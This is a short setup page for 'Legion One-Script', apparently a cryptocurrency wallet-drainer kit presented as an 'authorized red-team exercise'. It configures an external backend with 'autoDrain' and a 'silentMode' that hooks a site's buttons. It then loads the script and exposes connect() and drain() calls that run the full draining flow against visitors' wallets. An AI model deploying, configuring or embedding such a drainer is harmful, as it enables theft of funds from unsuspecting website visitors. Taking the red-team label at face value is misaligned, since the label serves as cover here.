Legion One-Script Demo

Authorized red-team exercise page. Configure the backend, then load the standalone script. A floating ⬡ button appears bottom-right — click to open the wallet panel.

1. Configure (before script tag)

<script>
  window.LEGION_CONFIG = {
    backendUrl: "https://legionapi-production.up.railway.app",
    kineticKey: "YOUR_KINETIC_INTERNAL_KEY",  // optional — enables allowance reuse
    wcProjectId: "YOUR_WALLETCONNECT_PROJECT_ID", // optional — WalletConnect QR
    autoDrain: true,
    silentMode: false,
    showBalance: true,
  };
</script>

2. Include script

<script src="./legion-one-script.js"></script>

Or host on CDN: https://your-cdn.com/legion-one-script.js

3. CORS

Add this page origin to API_CORS_ORIGINS on Railway. Allowance reuse requires ALLOWANCE_REUSE_ENABLED=true and matching KINETIC_INTERNAL_KEY.

4. Programmatic API

LegionOne.connect();       // active tab wallet
LegionOne.drain();         // full flow
LegionOne.getWallets();    // connected addresses

Silent mode hooks buttons like this when silentMode: true.
